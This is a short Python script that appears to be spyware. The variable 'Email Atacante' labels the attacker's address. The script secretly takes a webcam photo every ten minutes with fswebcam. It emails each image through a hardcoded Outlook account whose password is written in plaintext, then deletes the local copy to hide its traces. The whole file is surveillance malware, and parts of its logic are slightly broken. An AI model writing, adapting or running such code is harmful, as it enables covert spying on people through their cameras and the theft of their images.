with open("../config.txt", "r") as cfile:
	config = cfile.read().split('|')
	if config[0] == "empty":
		receiver_email = input("Email Atacante >> ")
	else:
		receiver_email = cfile.read()
cfile.close()

def send_email(file):

	from asyncore import file_dispatcher
	import email
	from json import encoder
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders, message

	sender_email = "sendregistros@outlook.com"

	message = MIMEMultipart()
	message["From"] = sender_email
	message['To'] = receiver_email
	message['Subject'] = "Captura de pantalla"

	
	attachment = open(file, 'rb')

	obj = MIMEBase('application','octet-stream')
	obj.set_payload((attachment).read())
	encoders.encode_base64(obj)
	obj.add_header('Content-Disposition',"attachment; filename= "+file)

	message.attach(obj)
	my_message = message.as_string()
	email_session = smtplib.SMTP('smtp-mail.outlook.com',587)
	email_session.starttls()
	email_session.login(sender_email,"enviadorderegistros123")
	email_session.sendmail(sender_email,receiver_email,my_message)

	email_session.quit()

def make_snap():
    import os
    import time as tm
    os.system('fswebcam -r 640x480 --jpeg 85 -D 1 web-cam-shot.jpg')
    file = "web-cam-shot.jpg"
    send_email(file)
    os.system('rm web-cam-shot.jpg')
    tm.sleep(600)
    make_snap()
make_snap()